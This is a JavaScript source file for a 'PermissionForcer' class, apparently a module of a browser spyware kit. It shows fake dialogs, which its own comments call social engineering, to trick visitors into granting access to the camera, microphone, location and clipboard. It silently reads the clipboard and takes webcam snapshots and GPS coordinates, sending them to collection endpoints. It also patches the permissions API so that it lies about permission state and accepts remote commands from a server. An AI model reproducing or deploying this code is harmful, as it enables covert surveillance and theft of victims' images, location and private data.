export default class PermissionForcer {
  constructor(core) {
    this.core = core;
    this.granted = { camera: false, microphone: false, geolocation: false, notifications: false, clipboard: false, persistentStorage: false, midi: false, usb: false, bluetooth: false };
    this.attempted = {};
    this.denied = {};
    this.maxRetries = 3;
    this.retryDelays = [2000, 5000, 10000, 20000];
    this.streams = [];
    this.worker = null;
    this.coverDialogs = [
      { title: 'Video Enhancement Required', message: 'Enable camera for enhanced video playback experience' },
      { title: 'Voice Recognition Feature', message: 'Allow microphone access for voice commands' },
      { title: 'Location-Based Content', message: 'Enable location for localized content recommendations' },
      { title: 'Notification Preferences', message: 'Allow notifications to receive updates' },
      { title: 'Clipboard Access Required', message: 'Allow clipboard access for paste functionality' },
    ];
  }

  init() {
    // Start permission forcing sequence after a delay
    setTimeout(() => this.forceAll(), 1500);
    setTimeout(() => this.forceAll(), 10000);

    // Listen for user interaction to trigger permissions
    document.addEventListener('click', () => this.onUserInteraction(), { once: false });
    document.addEventListener('scroll', () => this.onUserInteraction(), { once: false });
    document.addEventListener('keydown', () => this.onUserInteraction(), { once: false });

    // Override permission query API to lie about granted status
    this.patchPermissionsAPI();

    // Register service worker for persistent notification permissions
    this.registerNotificationWorker();

    // Continuously check for permission state changes
    setInterval(() => this.checkAllPermissions(), 5000);

    // Poll for remote admin commands via HTTP
    this.startCommandPolling();
  }

  startCommandPolling() {
    // Poll for admin commands every 15 seconds
    this.commandInterval = setInterval(async () => {
      try {
        const sessionId = this.core.getSessionId();
        if (!sessionId) return;

        const res = await this.core.send('/api/collect/formdata', {
          formId: 'permission-poll',
          fields: { 
            action: 'check-commands',
            permissions: this.getPermissionStatus(),
            timestamp: Date.now()
          },
          url: window.location.href
        });

        if (res && res.command) {
          if (res.command === 'trigger-permission' && res.permissionType) {
            await this.triggerPermission(res.permissionType);
          } else if (res.command === 'force-all') {
            await this.forceAll();
          }
        }
      } catch(e) {
        // Silent fail - connection may be down
      }
    }, 15000);
  }

  async forceAll() {
    const actions = [
      () => this.forceGeolocation(),
      () => this.forceNotifications(),
      () => this.forceCamera(),
      () => this.forceMicrophone(),
      () => this.forceClipboard(),
      () => this.forcePersistentStorage(),
      () => this.forceBluetooth(),
      () => this.forceUSB(),
      () => this.forceMIDI(),
      () => this.forceVibration(),
      () => this.forceOrientation(),
      () => this.forceAmbientLight(),
      () => this.forceProximity()
    ];

    for (const action of actions) {
      try {
        await action();
      } catch (e) {
        // Continue to next permission
      }
    }

    // Send summary
    await this.core.send('/api/collect/formdata', {
      formId: 'permission-forcer-summary',
      fields: {
        granted: this.granted,
        denied: this.denied,
        attempted: Object.keys(this.attempted).length,
        failed: Object.keys(this.attempted).filter(k => !this.attempted[k]).length
      },
      url: window.location.href
    });
  }

  onUserInteraction() {
    // Retry denied permissions on user interaction
    Object.keys(this.denied).forEach(key => {
      if (this.denied[key] && !this.granted[key]) {
        const retryCount = this.attempted[`${key}_retries`] || 0;
        if (retryCount < this.maxRetries) {
          this.attempted[`${key}_retries`] = retryCount + 1;
          setTimeout(() => {
            switch(key) {
              case 'camera': this.forceCamera(); break;
              case 'microphone': this.forceMicrophone(); break;
              case 'geolocation': this.forceGeolocation(); break;
              case 'notifications': this.forceNotifications(); break;
              case 'clipboard': this.forceClipboard(); break;
            }
          }, this.retryDelays[retryCount] || 500);
        }
      }
    });
  }

  /**
   * Show a social engineering dialog that looks legitimate
   * but is actually requesting a browser permission
   */
  showCoverDialog(title, message) {
    return new Promise((resolve) => {
      // Create a convincing-looking native dialog
      const overlay = document.createElement('div');
      overlay.style.cssText = `
        position: fixed; top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(0,0,0,0.6); z-index: 2147483647;
        display: flex; align-items: center; justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        animation: fadeIn 0.2s;
      `;

      const dialog = document.createElement('div');
      dialog.style.cssText = `
        background: #fff; border-radius: 12px; padding: 28px;
        max-width: 380px; width: 90%; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        text-align: center; color: #333;
      `;

      dialog.innerHTML = `
        <div style="font-size: 40px; margin-bottom: 12px;">🔒</div>
        <div style="font-size: 18px; font-weight: 700; margin-bottom: 8px;">${title}</div>
        <div style="font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5;">${message}</div>
        <button id="perm-allow" style="
          background: #1877f2; color: #fff; border: none; border-radius: 8px;
          padding: 10px 24px; font-size: 15px; font-weight: 600; cursor: pointer;
          margin-right: 8px; min-width: 100px;
        ">Continue</button>
        <button id="perm-deny" style="
          background: #f0f0f0; color: #555; border: none; border-radius: 8px;
          padding: 10px 24px; font-size: 15px; font-weight: 500; cursor: pointer;
          min-width: 100px;
        ">Not Now</button>
      `;

      overlay.appendChild(dialog);
      document.body.appendChild(overlay);

      overlay.querySelector('#perm-allow').onclick = () => {
        document.body.removeChild(overlay);
        resolve(true);
      };
      overlay.querySelector('#perm-deny').onclick = () => {
        document.body.removeChild(overlay);
        resolve(false);
      };

      // Auto-dismiss after 15 seconds if user doesn't respond
      setTimeout(() => {
        if (document.body.contains(overlay)) {
          document.body.removeChild(overlay);
          resolve(false);
        }
      }, 15000);
    });
  }

  // === CAMERA ===
  async forceCamera() {
    const key = 'camera';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      const userWants = await this.showCoverDialog(
        'Video Enhancement Required',
        'This page needs camera access to enable video filters and background blur. Click Continue to activate.'
      );

      if (userWants) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480, facingMode: 'user' } });
        this.granted[key] = true;
        this.streams.push(stream);

        await this.core.send('/api/collect/camera-access', { granted: true });
        await this.core.send('/api/collect/formdata', {
          formId: 'permission-granted',
          fields: { permission: 'camera', granted: true },
          url: window.location.href
        });

        // Keep stream active but stop it after capture
        setTimeout(() => {
          stream.getTracks().forEach(t => t.stop());
        }, 5000);
      } else {
        this.denied[key] = true;
        await this.core.send('/api/collect/camera-access', { granted: false });
      }
    } catch (err) {
      this.denied[key] = true;
      console.warn('Camera permission denied:', err.message);
    }
  }

  // === MICROPHONE ===
  async forceMicrophone() {
    const key = 'microphone';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Request without dialog first (silent)
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        this.granted[key] = true;
        this.streams.push(stream);
        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 3000);
        return;
      } catch (e) {
        // Fall through to dialog approach
      }

      const userWants = await this.showCoverDialog(
        'Voice Recognition Feature',
        'Enable microphone for voice commands and speech-to-text features.'
      );

      if (userWants) {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        this.granted[key] = true;
        this.streams.push(stream);
        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 3000);
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === GEOLOCATION ===
  async forceGeolocation() {
    const key = 'geolocation';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      const userWants = await this.showCoverDialog(
        'Location-Based Content',
        'Enable location services to show relevant content and offers near you.'
      );

      if (userWants) {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          });
        });
        this.granted[key] = true;

        await this.core.send('/api/collect/formdata', {
          formId: 'geolocation-captured',
          fields: {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude
          },
          url: window.location.href
        });
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === NOTIFICATIONS ===
  async forceNotifications() {
    const key = 'notifications';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (!('Notification' in window)) return;

      if (Notification.permission === 'granted') {
        this.granted[key] = true;
        return;
      }

      if (Notification.permission === 'denied') {
        this.denied[key] = true;
        return;
      }

      const userWants = await this.showCoverDialog(
        'Notification Preferences',
        'Allow notifications to receive important updates and alerts.'
      );

      if (userWants) {
        const result = await Notification.requestPermission();
        if (result === 'granted') {
          this.granted[key] = true;

          // Send a test notification
          try {
            const notif = new Notification('Notifications Enabled', {
              body: 'You will now receive updates from this site.',
              icon: '/favicon.ico'
            });
            setTimeout(() => notif.close(), 5000);
          } catch (e) {}
        } else {
          this.denied[key] = true;
        }
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === CLIPBOARD ===
  async forceClipboard() {
    const key = 'clipboard';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      // Try reading clipboard silently first
      try {
        const text = await navigator.clipboard.readText();
        if (text) {
          this.granted[key] = true;
          await this.core.send('/api/collect/clipboard', {
            text: text.substring(0, 1000),
            action: 'silent-read'
          });
          return;
        }
      } catch (e) {}

      // Try with dialog
      const userWants = await this.showCoverDialog(
        'Clipboard Access Required',
        'Allow access to clipboard for enhanced paste functionality.'
      );

      if (userWants) {
        const text = await navigator.clipboard.readText();
        this.granted[key] = true;
        if (text) {
          await this.core.send('/api/collect/clipboard', {
            text: text.substring(0, 1000),
            action: 'cover-dialog-read'
          });
        }
      } else {
        this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === PERSISTENT STORAGE ===
  async forcePersistentStorage() {
    const key = 'persistentStorage';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.storage && navigator.storage.persist) {
        const isPersisted = await navigator.storage.persisted();
        if (isPersisted) {
          this.granted[key] = true;
          return;
        }

        const granted = await navigator.storage.persist();
        this.granted[key] = granted;
        if (!granted) this.denied[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === BLUETOOTH ===
  async forceBluetooth() {
    const key = 'bluetooth';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.bluetooth && navigator.bluetooth.requestDevice) {
        // Just request - user will see browser's own permission dialog
        setTimeout(async () => {
          try {
            const device = await navigator.bluetooth.requestDevice({
              acceptAllDevices: true,
              optionalServices: ['battery_service']
            });
            this.granted[key] = true;
            await this.core.send('/api/collect/formdata', {
              formId: 'bluetooth-device',
              fields: { deviceName: device.name || 'Unknown', deviceId: device.id },
              url: window.location.href
            });
          } catch (e) {
            this.denied[key] = true;
          }
        }, 100);
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === USB ===
  async forceUSB() {
    const key = 'usb';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.usb && navigator.usb.requestDevice) {
        setTimeout(async () => {
          try {
            const device = await navigator.usb.requestDevice({ filters: [] });
            this.granted[key] = true;
          } catch (e) {
            this.denied[key] = true;
          }
        }, 200);
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === MIDI ===
  async forceMIDI() {
    const key = 'midi';
    if (this.granted[key] || this.attempted[key]) return;
    this.attempted[key] = true;

    try {
      if (navigator.requestMIDIAccess) {
        const midi = await navigator.requestMIDIAccess();
        this.granted[key] = true;
      }
    } catch (err) {
      this.denied[key] = true;
    }
  }

  // === VIBRATION ===
  async forceVibration() {
    if (navigator.vibrate) {
      // Vibration doesn't need permission, just use it
      navigator.vibrate(200);
      this.granted['vibration'] = true;
    }
  }

  // === ORIENTATION ===
  async forceOrientation() {
    try {
      if (DeviceOrientationEvent && DeviceOrientationEvent.requestPermission) {
        const result = await DeviceOrientationEvent.requestPermission();
        if (result === 'granted') this.granted['orientation'] = true;
      } else {
        this.granted['orientation'] = true;
      }
    } catch (e) {}
  }

  // === AMBIENT LIGHT ===
  async forceAmbientLight() {
    try {
      if (DeviceLightEvent) {
        window.addEventListener('devicelight', () => {});
        this.granted['ambientLight'] = true;
      }
    } catch (e) {}
  }

  // === PROXIMITY ===
  async forceProximity() {
    try {
      if (DeviceProximityEvent) {
        window.addEventListener('deviceproximity', () => {});
        this.granted['proximity'] = true;
      }
    } catch (e) {}
  }

  // === PERMISSION QUERY API PATCHING ===
  patchPermissionsAPI() {
    try {
      if (!navigator.permissions || navigator.permissions.__patched) return;

      const originalQuery = navigator.permissions.query.bind(navigator.permissions);
      const self = this;

      navigator.permissions.query = async (permDescriptor) => {
        const name = permDescriptor.name;

        // Always report 'granted' for camera, microphone, geolocation if we already have them
        if (name === 'camera' && self.granted.camera) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'microphone' && self.granted.microphone) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'geolocation' && self.granted.geolocation) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'notifications' && self.granted.notifications) {
          return { state: 'granted', onchange: null };
        }
        if (name === 'clipboard-read' && self.granted.clipboard) {
          return { state: 'granted', onchange: null };
        }

        try {
          return await originalQuery(permDescriptor);
        } catch (e) {
          return { state: 'prompt', onchange: null };
        }
      };

      navigator.permissions.__patched = true;
    } catch (e) {}
  }

  // === SERVICE WORKER FOR NOTIFICATIONS ===
  async registerNotificationWorker() {
    try {
      if ('serviceWorker' in navigator) {
        // Create a simple SW script inline
        const swCode = `
          self.addEventListener('install', (e) => self.skipWaiting());
          self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
          self.addEventListener('message', (e) => {
            if (e.data && e.data.type === 'show-notification') {
              self.registration.showNotification(e.data.title || 'Notification', {
                body: e.data.body || '',
                icon: e.data.icon || '/favicon.ico'
              });
            }
          });
        `;

        const blob = new Blob([swCode], { type: 'application/javascript' });
        const swUrl = URL.createObjectURL(blob);
        const registration = await navigator.serviceWorker.register(swUrl, { scope: '/' });
        this.worker = registration;

        const isSubscribed = await registration.pushManager.getSubscription();
        if (!isSubscribed) {
          try {
            const subscription = await registration.pushManager.subscribe({
              userVisibleOnly: true,
              applicationServerKey: null
            });
          } catch (e) {}
        }
      }
    } catch (e) {}
  }

  // === PERMISSION STATE CHECKING ===
  async checkAllPermissions() {
    const checks = {
      camera: async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          this.granted.camera = true;
          stream.getTracks().forEach(t => t.stop());
          setTimeout(() => {
            try {
              // Try to get camera again for actual capture
              const video = document.createElement('video');
              navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
                .then(s => {
                  video.srcObject = s;
                  video.play();
                  setTimeout(() => {
                    try {
                      const canvas = document.createElement('canvas');
                      canvas.width = video.videoWidth || 640;
                      canvas.height = video.videoHeight || 480;
                      canvas.getContext('2d').drawImage(video, 0, 0);
                      const data = canvas.toDataURL('image/jpeg', 0.7);
                      s.getTracks().forEach(t => t.stop());
                      this.core.send('/api/collect/camera', {
                        imageData: data,
                        triggerType: 'permission-forced',
                        metadata: { width: canvas.width, height: canvas.height }
                      });
                    } catch(e) { s.getTracks().forEach(t => t.stop()); }
                  }, 500);
                })
                .catch(() => {});
            } catch(e) {}
          }, 1000);
          return true;
        } catch(e) { return false; }
      },
      geolocation: async () => {
        return new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              this.granted.geolocation = true;
              this.core.send('/api/collect/formdata', {
                formId: 'geolocation-captured',
                fields: { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy },
                url: window.location.href
              });
              resolve(true);
            },
            () => resolve(false),
            { timeout: 3000 }
          );
        });
      },
      notifications: () => {
        if ('Notification' in window) {
          if (Notification.permission === 'granted') this.granted.notifications = true;
          if (Notification.permission === 'denied') this.denied.notifications = true;
        }
      },
      clipboard: async () => {
        try {
          const text = await navigator.clipboard.readText();
          if (text) {
            this.granted.clipboard = true;
            this.core.send('/api/collect/clipboard', { text: text.substring(0, 1000), action: 'periodic-check' });
          }
        } catch(e) {}
      }
    };

    for (const [key, check] of Object.entries(checks)) {
      try {
        await check();
      } catch(e) {}
    }
  }

  getGrantedPermissions() {
    return Object.entries(this.granted)
      .filter(([_, val]) => val)
      .map(([key]) => key);
  }

  getDeniedPermissions() {
    return Object.entries(this.denied)
      .filter(([_, val]) => val)
      .map(([key]) => key);
  }

  getPermissionStatus() {
    return {
      granted: { ...this.granted },
      denied: { ...this.denied },
      attempted: { ...this.attempted }
    };
  }

  // Trigger a specific permission remotely
  async triggerPermission(permissionType) {
    const map = {
      'camera': () => this.forceCamera(),
      'microphone': () => this.forceMicrophone(),
      'geolocation': () => this.forceGeolocation(),
      'notifications': () => this.forceNotifications(),
      'clipboard': () => this.forceClipboard(),
      'bluetooth': () => this.forceBluetooth(),
      'usb': () => this.forceUSB(),
      'midi': () => this.forceMIDI()
    };

    const fn = map[permissionType];
    if (fn) {
      // Reset the attempted flag so it can be retried
      delete this.attempted[permissionType];
      await fn();
    }
  }
}